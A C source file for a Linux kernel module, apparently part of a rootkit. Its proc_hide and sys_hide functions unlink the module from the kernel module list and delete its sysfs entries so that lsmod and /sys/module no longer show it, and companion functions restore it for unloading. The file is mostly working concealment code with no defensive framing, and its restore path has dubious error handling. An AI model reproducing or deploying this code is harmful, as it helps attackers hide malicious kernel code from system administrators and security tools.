#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/sysfs.h>
#include <linux/slab.h>

// Required definitions
// module.h
struct module_sect_attr {
	struct bin_attribute battr;
	unsigned long address;
};

struct module_sect_attrs {
	struct attribute_group grp;
	unsigned int nsections;
	struct module_sect_attr attrs[];
};

struct module_notes_attrs {
	struct kobject *dir;
	unsigned int notes;
	struct bin_attribute attrs[];
};

// kernel/params.c
struct param_attribute
{
    struct module_attribute mattr;
    const struct kernel_param *param;
};

struct module_param_attrs
{
    unsigned int num;
    struct attribute_group grp;
    struct param_attribute attrs[0];
};

/*
 * sysfs restoration helpers.
 * Mostly copycat from the kernel with
 * light modifications to handle only a subset
 * of sysfs files
 */
static ssize_t show_refcnt(struct module_attribute *mattr,
        struct module_kobject *mk, char *buffer){
    return sprintf(buffer, "%i\n", module_refcount(mk->mod));
}
static struct module_attribute modinfo_refcnt =
    __ATTR(refcnt, 0444, show_refcnt, NULL);

static struct module_attribute *modinfo_attrs[] = {
    &modinfo_refcnt,
    NULL,
};

static void module_remove_modinfo_attrs(struct module *mod)
{
    struct module_attribute *attr;

    attr = &mod->modinfo_attrs[0]; // Get first attr
    if (attr && attr->attr.name) {
        sysfs_remove_file(&mod->mkobj.kobj, &attr->attr); // Remove kernfs node corresponding to attr
        if (attr->free)
            attr->free(mod);
    }
    kfree(mod->modinfo_attrs);
}

static int module_add_modinfo_attrs(struct module *mod)
{
    struct module_attribute *attr;
    struct module_attribute *temp_attr;
    int error = 0;

    mod->modinfo_attrs = kzalloc((sizeof(struct module_attribute) *
                (ARRAY_SIZE(modinfo_attrs) + 1)),
            GFP_KERNEL); // Allocate memory for attributes
    if (!mod->modinfo_attrs)
        return -ENOMEM;

    temp_attr = mod->modinfo_attrs;
    attr = modinfo_attrs[0];
    if (!attr->test || attr->test(mod)) {
        memcpy(temp_attr, attr, sizeof(*temp_attr));
        sysfs_attr_init(&temp_attr->attr);
        error = sysfs_create_file(&mod->mkobj.kobj,
                &temp_attr->attr);
        if (error)
            goto error_out;
    }

    return 0;

error_out:
    module_remove_modinfo_attrs(mod);
    return error;
}


struct rmmod_controller {
    struct kobject *parent;
    struct module_sect_attrs *attrs;
    const char *name;
};

static struct rmmod_controller rmmod_ctrl;
//
//
//

struct __lkm_t{ struct module *this_mod; };
static const struct __lkm_t lkm = {
    .this_mod = THIS_MODULE,
};

static struct list_head *mod_list;

struct kobject *this_kobj = &(lkm.this_mod->mkobj.kobj);

struct module_sect_attrs *sect_attrs_prev;
struct module_notes_attrs *notes_attrs_prev;



static inline void new_list_del(struct list_head *prev, struct list_head *next)
{
    next->prev = prev;
    prev->next = next;
}

static void proc_hide(void)
{

    mod_list = lkm.this_mod->list.prev;
    new_list_del(lkm.this_mod->list.prev, lkm.this_mod->list.next);

    lkm.this_mod->list.next = (struct list_head*)LIST_POISON2;
    lkm.this_mod->list.prev = (struct list_head*)LIST_POISON1;
}

static void proc_show(void)
{
    if (!mod_list)
        return;
    list_add(&(lkm.this_mod->list), mod_list);
}


static void sys_hide(void)
{
    /** Backup and remove this module from sysfs */
    rmmod_ctrl.attrs = THIS_MODULE->sect_attrs;
    rmmod_ctrl.parent = this_kobj->parent;
    rmmod_ctrl.name = THIS_MODULE->name;
    
    kobject_del(lkm.this_mod->holders_dir->parent);
   
    // Mess with known marker left from kobject_del
    lkm.this_mod->holders_dir->parent->state_in_sysfs = 1;
    /*
     * enum module_state {
     *	 MODULE_STATE_LIVE,	 Normal state. 
     *	 MODULE_STATE_COMING,	 Full formed, running module_init. 
     *	 MODULE_STATE_GOING,	 Going away. 
     *	 MODULE_STATE_UNFORMED,	 Still setting it up. 
     *  };
     */
    lkm.this_mod->state = MODULE_STATE_UNFORMED;
}

static void sys_show(void)
{
    int err;
    struct kobject *kobj;

    
    lkm.this_mod->state = MODULE_STATE_LIVE; // Change module state to normal
    err = kobject_add(this_kobj, rmmod_ctrl.parent, rmmod_ctrl.name); // Add kobj
    if (err)
        goto put_kobj;
    
    kobj = kobject_create_and_add("holders", this_kobj); // Add kobj for holders
    if (!kobj)
        goto put_kobj;

    lkm.this_mod->holders_dir = kobj; // Change THIS_MODULE->holders_dir to our newly created kobj
    
    // Create sysfs representation of kernel objects
    err = sysfs_create_group(this_kobj, &rmmod_ctrl.attrs->grp); 
    if (err)
	goto put_kobj;
    
    // Setup attributes
    err = module_add_modinfo_attrs(lkm.this_mod);
    if (err)
        goto err_attrs;
    
    goto put_kobj;

put_kobj:
    kobject_put(this_kobj);
    mod_list = NULL;

err_attrs:
    // Reset attributes
    if (lkm.this_mod->mkobj.mp) {
        sysfs_remove_group(this_kobj, &lkm.this_mod->mkobj.mp->grp);
        if (lkm.this_mod->mkobj.mp)
            kfree(lkm.this_mod->mkobj.mp->grp.attrs);
        kfree(lkm.this_mod->mkobj.mp);
        lkm.this_mod->mkobj.mp = NULL;
    }
}
